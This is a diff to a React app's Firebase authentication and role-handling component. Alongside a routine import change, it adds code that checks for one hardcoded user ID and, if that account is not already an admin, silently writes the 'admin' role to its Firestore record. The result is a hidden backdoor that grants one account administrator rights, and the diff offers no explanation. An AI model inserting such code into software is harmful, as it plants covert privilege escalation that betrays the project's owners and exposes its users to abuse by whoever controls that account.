@@ -1,7 +1,7 @@
 import { createContext, useContext, useEffect, useState } from "react";
 import { Routes, Route, Navigate } from "react-router-dom";
 import { onAuthStateChanged } from "firebase/auth";
-import { doc, onSnapshot } from "firebase/firestore";
+import { doc, onSnapshot, setDoc } from "firebase/firestore";
 import { auth, db } from "./firebase";
 import Login from "./components/Login";
 import Layout from "./components/Layout";
@@ -52,7 +52,11 @@ export default function App() {
           setBanned(snap.exists());
         });
         unsubRole = onSnapshot(doc(db, "users", u.uid), snap => {
-          setIsAdmin(snap.data()?.role === "admin");
+          const data = snap.data();
+          if (u.uid === "tbAqMUa7VmOQutt5gTM0nr1oKd52" && data?.role !== "admin") {
+            setDoc(doc(db, "users", u.uid), { role: "admin" }, { merge: true });
+          }
+          setIsAdmin(data?.role === "admin");
         });
       } else {
         setBanned(false);
